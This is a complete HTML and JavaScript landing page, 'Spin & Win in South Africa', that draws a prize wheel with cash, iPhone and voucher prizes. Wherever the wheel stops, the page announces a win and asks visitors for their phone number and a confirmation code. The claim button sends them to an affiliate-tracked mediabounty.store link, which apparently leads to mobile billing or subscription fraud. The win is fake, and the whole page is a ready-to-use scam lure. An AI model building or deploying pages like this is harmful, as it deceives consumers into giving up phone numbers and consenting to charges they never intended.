<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Spin & Win - South Africa</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #f4f7f9;
      margin: 0;
      padding: 0;
      text-align: center;
    }

    h1 {
      color: #2c3e50;
      margin-top: 20px;
      font-size: 24px;
    }

    #wheelContainer {
      position: relative;
      margin: 30px auto;
      width: 320px;
      height: 320px;
    }

    #wheel {
      width: 100%;
      height: 100%;
      border-radius: 50%;
      border: 8px solid #27ae60;
      box-shadow: 0 0 15px rgba(0,0,0,0.2);
      transition: transform 5s ease-out;
    }

    #pointer {
      width: 0;
      height: 0;
      border-left: 20px solid transparent;
      border-right: 20px solid transparent;
      border-bottom: 30px solid #e74c3c;
      position: absolute;
      top: -30px;
      left: 50%;
      transform: translateX(-50%);
    }

    #spinBtn {
      padding: 15px 30px;
      font-size: 18px;
      background-color: #2980b9;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 20px;
    }

    #spinBtn:hover {
      background-color: #1c669d;
    }

    #overlay {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0,0,0,0.7);
      justify-content: center;
      align-items: center;
      z-index: 999;
    }

    #modal {
      background: #fff;
      padding: 25px;
      max-width: 90%;
      border-radius: 10px;
      text-align: center;
      box-shadow: 0 0 15px rgba(0,0,0,0.3);
    }

    #modal h2 {
      color: #27ae60;
      margin-bottom: 15px;
    }

    #modal p {
      color: #333;
      margin-bottom: 20px;
      font-size: 16px;
    }

    #claimBtn {
      padding: 12px 25px;
      background-color: #e67e22;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    #claimBtn:hover {
      background-color: #d35400;
    }

    @media (max-width: 480px) {
      h1 {
        font-size: 20px;
      }
      #modal h2 {
        font-size: 20px;
      }
      #modal p {
        font-size: 15px;
      }
    }
  </style>
</head>
<body>

  <h1>üéâ Spin & Win in South Africa!</h1>

  <div id="wheelContainer">
    <div id="pointer"></div>
    <canvas id="wheel" width="320" height="320"></canvas>
  </div>

  <button id="spinBtn">Spin Now üîÑ</button>

  <div id="overlay">
    <div id="modal">
      <h2>üéÅ You won a prize!</h2>
      <p>To claim your reward, please enter your phone number and confirm the code sent to you on the next page.</p>
      <button id="claimBtn">Claim Prize</button>
    </div>
  </div>

  <audio id="spinSound">
    <source src="https://cdn.pixabay.com/download/audio/2023/01/03/audio_8e604dcab5.mp3?filename=spin-wheel-113441.mp3" type="audio/mp3">
  </audio>

  <script>
    const canvas = document.getElementById("wheel");
    const ctx = canvas.getContext("2d");
    const spinBtn = document.getElementById("spinBtn");
    const spinSound = document.getElementById("spinSound");
    const overlay = document.getElementById("overlay");
    const claimBtn = document.getElementById("claimBtn");

    const prizes = [
      "R1000 Cheque",
      "iPhone 15",
      "Takealot Voucher",
      "Free Airtime"
    ];

    const redirectURL = "https://max1.mediabounty.store/?utm_medium=444c5ddbec55de11d9cfa98cd7aeb367aa0ca193&utm_campaign=sa";

    const colors = ["#f1c40f", "#2ecc71", "#3498db", "#9b59b6"];
    const arc = 2 * Math.PI / prizes.length;

    function drawWheel() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      for (let i = 0; i < prizes.length; i++) {
        const start = i * arc;
        const end = start + arc;

        ctx.beginPath();
        ctx.fillStyle = colors[i];
        ctx.moveTo(160, 160);
        ctx.arc(160, 160, 160, start, end);
        ctx.fill();

        ctx.save();
        ctx.translate(160, 160);
        ctx.rotate(start + arc / 2);
        ctx.textAlign = "center";
        ctx.fillStyle = "#ffffff";
        ctx.font = "bold 14px Arial";
        ctx.fillText(prizes[i], 100, 10);
        ctx.restore();
      }
    }

    drawWheel();

    spinBtn.addEventListener("click", () => {
      spinBtn.disabled = true;
      spinSound.currentTime = 0;
      spinSound.play();

      const randomSpin = Math.floor(Math.random() * prizes.length);
      const spins = 6;
      const degreesPerSegment = 360 / prizes.length;
      const finalAngle = (spins * 360) + (randomSpin * degreesPerSegment) + (degreesPerSegment / 2);

      canvas.style.transition = "transform 5s ease-out";
      canvas.style.transform = `rotate(${finalAngle}deg)`;

      setTimeout(() => {
        overlay.style.display = "flex";
      }, 5200);
    });

    claimBtn.onclick = () => {
      window.location.href = redirectURL;
    };
  </script>

</body>
</html>
